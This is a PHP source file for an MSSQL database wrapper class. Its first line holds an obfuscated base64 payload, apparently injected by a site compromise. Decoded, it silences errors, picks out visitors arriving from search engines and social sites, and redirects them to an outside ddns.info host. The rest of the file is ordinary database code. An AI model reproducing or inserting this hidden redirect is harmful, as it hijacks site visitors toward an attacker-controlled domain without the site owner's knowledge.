<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(GENERIC_PATH."db/db.php");
require_once(GENERIC_PATH."utils/utils.php");

class db_mssql extends db {

  function db_mssql($db_server, $db_name, $db_user, $db_password) {

    parent::db($db_server, $db_name, $db_user, $db_password);

    $this->capabilities["last_id"]              = true;
    $this->capabilities["count_by_resource"]    = true;
    $this->capabilities["query_limited_amount"] = true;
    $this->capabilities["value_type_check"]     = true;
    $this->capabilities["sysoffset"]            = true;

  }

  function connect($db_server, $db_name, $db_user, $db_password) {

    global $log;
    $this->connection = mssql_connect($db_server, $db_user, $db_password, true);
    if (!$this->connection)
      critical_error("Can't connect to database $db_server");
    if (!mssql_select_db($db_name, $this->connection))
      critical_error("Can't select database $db_name: ".$this->get_last_error());

    if ($this->charset)
      $this->query("SET NAMES '".$this->charset."'");

  }

  function get_last_error() { 
 
    return mssql_get_last_message(); 
    
  }

  function internal_query($sql) { 
    
    return mssql_query($sql, $this->connection); 
    
  }
  
  function internal_count($query) { 
    
    return mssql_num_rows($query); 
    
  }
  
  function internal_num_row($query) { 
    
    return mssql_fetch_row($query); 
    
  }
  
  function internal_row($query) { 
                                    
    return mssql_fetch_assoc($query); 
  
  }

  function last_id() {

    return $this->value("SELECT @@IDENTITY");

  }

  function internal_field_defs($query) {

    $field_defs = array();
    $field_count = mssql_num_fields($query);
    for ($i=0; $i < $field_count; $i++)
      $field_defs[mssql_field_name($query, $i)] = array( "length" => mssql_field_length($query, $i)
														    			                                  , "type"   => mssql_field_type($query, $i));
    return $field_defs;

  }

  function date_empty($date) { 

    return !strtotime($date);

  }

  function limit($sql, $from, $count) {

    $limit = "SELECT TOP ".($from + $count)." /*SYSOFFSET:".$from."*/";
    $sql = preg_replace("/SELECT/", $limit, $sql);
    return $sql;
    
  }

  function to_date($date, $format = "dmy") {
    
    if (is_string($date)) {
      return date('Ymd', str_to_date($date, array("mode" => "m", "date_format" => $format)));
    } else
      return date('Ymd', $date);
      
  }

  function to_datetime($date, $format = "dmy") {

    if (is_string($date)) {
      return date('Ymd H:i:s', str_to_date($date, array("mode" => "m", "date_format" => $format)));
    } else
      return date('Ymd H:i:s', $date);

  }

  function from_date($date) {
    
    return strtotime($date);

  }

  function from_datetime($date) {

    return strtotime($date);

  }
  
  function addslashes($value) {

    return str_replace("'", "''", $value);

  }

}

?>